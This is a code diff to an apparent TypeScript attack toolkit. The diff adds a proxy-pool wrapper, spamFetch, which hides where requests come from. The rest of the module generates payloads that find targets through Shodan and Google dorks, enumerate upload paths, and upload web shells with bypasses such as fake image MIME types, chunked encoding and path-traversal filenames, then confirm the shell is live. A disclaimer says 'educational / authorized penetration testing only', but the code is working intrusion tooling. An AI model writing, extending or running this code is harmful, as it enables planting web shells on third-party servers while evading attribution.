@@ -12,8 +12,17 @@
  *
  * Educational / authorized penetration testing only.
  */
+import { fetchWithPoolProxy } from "./proxy-pool";
 import { invokeLLM } from "./_core/llm";
 import crypto from "crypto";
+
+// Helper: wrap fetch with proxy pool
+async function spamFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
+  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+  const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
+  return response;
+}
+
 
 // ═══════════════════════════════════════════════════════
 //  CONSTANTS & SIGNATURES
@@ -257,7 +266,7 @@ export function discoverTargetsShodan(targetDomain: string): SpamPayload[] {
     payloads.push({
       type: "shodan_search",
       technique: "Shodan API vulnerability scan",
-      code: `// Shodan Query: ${enrichedQuery}\nconst response = await fetch("${shodanUrl}");\nconst data = await response.json();\nconst targets = data.matches.map(m => \`\${m.ip_str}:\${m.port}\`);`,
+      code: `// Shodan Query: ${enrichedQuery}\nconst response = await fetch("${shodanUrl}")\nconst data = await response.json();\nconst targets = data.matches.map(m => \`\${m.ip_str}:\${m.port}\`);`,
       size: enrichedQuery.length,
       effect: `Discover open upload endpoints on ${domain} via Shodan`,
       features: ["port_scan", "service_detection", "vulnerability_mapping"],
@@ -273,7 +282,7 @@ export function discoverTargetsShodan(targetDomain: string): SpamPayload[] {
     payloads.push({
       type: "google_dork",
       technique: "Google Dork vulnerability discovery",
-      code: `// Google Dork: ${enrichedDork}\nconst response = await fetch("${googleUrl}", {\n  headers: { "User-Agent": "Mozilla/5.0" }\n});\nconst html = await response.text();\nconst links = html.match(/https?:\\/\\/[^\\s"]+?\\.php[^\\s"]*/g);`,
+      code: `// Google Dork: ${enrichedDork}\nconst response = await fetch("${googleUrl}", {\n  headers: { "User-Agent": "Mozilla/5.0" }\n});\nconst html = await response.text();\nconst links = html.match(/https?:\/\/[^\s"]+?\.php[^\s"]*/g);`,
       size: enrichedDork.length,
       effect: `Find exposed upload scripts and file managers on ${domain}`,
       features: ["dork_scan", "path_discovery", "upload_finder"],
@@ -289,7 +298,7 @@ async function enumerateUploadPaths(baseUrl) {
   const found = [];
   for (const path of targetPaths) {
     try {
-      const res = await fetch(baseUrl + path, { method: 'HEAD' });
+      const res = await spamFetch(baseUrl + path, { method: 'HEAD' });
       if (res.status < 400) {
         found.push({ path, status: res.status, writable: true });
       }
@@ -330,7 +339,7 @@ async function getWorkingProxy() {
     try {
       const controller = new AbortController();
       setTimeout(() => controller.abort(), 5000);
-      const res = await fetch("http://httpbin.org/ip", {
+      const res = await spamFetch("http://httpbin.org/ip", {
         agent: new ProxyAgent(proxy),
         signal: controller.signal,
       });
@@ -560,7 +569,7 @@ async function tryUploadWithBypass(targetUrl, shellCode) {
       const formData = new FormData();
       formData.append('file', new Blob([shellCode], { type: 'image/jpeg' }), filename);
 
-      const res = await fetch(uploadUrl, {
+      const res = await spamFetch(uploadUrl, {
         method: 'POST',
         body: formData,
         headers,
@@ -568,7 +577,7 @@ async function tryUploadWithBypass(targetUrl, shellCode) {
 
       if (res.status < 400) {
         const checkUrl = uploadUrl + filename;
-        const check = await fetch(checkUrl);
+        const check = await spamFetch(checkUrl);
         if ((await check.text()).includes("OK")) {
           console.log(\`SUCCESS! Shell → \${checkUrl}\`);
           return checkUrl;
@@ -644,7 +653,7 @@ async function uploadWithChunkedEncoding(url, shellCode) {
   }
   body += '0\\r\\n\\r\\n';
 
-  const res = await fetch(url, {
+  const res = await spamFetch(url, {
     method: 'POST',
     headers: {
       'Transfer-Encoding': 'chunked',
@@ -681,7 +690,7 @@ async function tryPathTraversal(uploadUrl, shellCode) {
     const formData = new FormData();
     formData.append('file', new Blob([shellCode]), path);
     try {
-      const res = await fetch(uploadUrl, { method: 'POST', body: formData });
+      const res = await spamFetch(uploadUrl, { method: 'POST', body: formData });
       if (res.status < 400) return { success: true, path };
     } catch {}
   }
